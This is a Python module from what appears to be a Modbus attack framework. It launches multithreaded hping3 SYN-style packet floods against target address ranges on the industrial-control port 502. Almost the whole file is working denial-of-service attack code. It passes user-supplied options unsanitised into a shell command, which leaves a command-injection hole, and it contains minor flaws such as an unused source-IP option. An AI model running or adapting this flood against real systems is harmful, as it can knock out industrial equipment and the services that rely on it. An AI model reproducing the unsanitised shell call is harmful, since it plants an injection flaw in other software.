import os
import threading
import subprocess
from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc
from typing import Optional


class Module:
    info = {
        'Name': 'Flooding Attack',
        'Author': ['@Danel'],
        'Description': "Flooding Attack with Hping script",
    }

    options = {
        'RHOSTS': ['', True, 'The target address range or CIDR identifier'],
        'RPORT': [502, False, 'The port number for modbus protocol'],
        'FLAG': ['-S', True, 'Set the FLAG [-S, -F, -R, -P, -A, -U]'],
        'sIP': ['', True, 'Source IP (--rand-source)'],
        'Threads': [1, False, 'The number of concurrent threads'],
        'Output': [True, False, 'Save stdout to the output directory'],
    }

    output = ''

    def validate_options(self) -> bool:
        """Validates required options before running the exploit."""
        missing = [opt for opt, details in self.options.items() if details[1] and not details[0]]
        if missing:
            for opt in missing:
                self.printLine(f"[-] Missing required option: {opt}", bcolors.FAIL)
            return False
        return True

    def exploit(self):
        """Initiates the flooding attack."""
        if not self.validate_options():
            return

        threads = self.options['Threads'][0]
        try:
            threads = int(threads)
            if threads < 1:
                raise ValueError
        except ValueError:
            self.printLine("[-] Threads must be a positive integer.", bcolors.FAIL)
            return

        self.printLine("[+] Flooding Attack started:", bcolors.OKGREEN)
        self.printLine(f"[+] Command: hping3 {self.options['FLAG'][0]} -p {self.options['RPORT'][0]} --flood {self.options['RHOSTS'][0]}", bcolors.OKBLUE)
        self.printLine("[-] Press Ctrl+C to stop.", bcolors.WARNING)

        try:
            for _ in range(threads):
                t = threading.Thread(target=self.run_hping)
                t.daemon = True
                t.start()
            t.join()  # Wait for all threads to finish
        except KeyboardInterrupt:
            self.printLine("[-] Attack stopped by user.", bcolors.WARNING)

    def run_hping(self):
        """Runs the hping3 command."""
        try:
            command = f"/usr/sbin/hping3 {self.options['FLAG'][0]} -p {self.options['RPORT'][0]} --flood {self.options['RHOSTS'][0]}"
            subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            self.printLine(f"[-] Error running hping3: {e}", bcolors.FAIL)

    def printLine(self, text: str, color: str):
        """Prints colored text to the console."""
        self.output += text + '\n'
        if '[+]' in text:
            print(text.replace('[+]', color + '[+]' + bcolors.ENDC))
        elif '[-]' in text:
            print(text.replace('[-]', color + '[-]' + bcolors.ENDC))
        else:
            print(text)
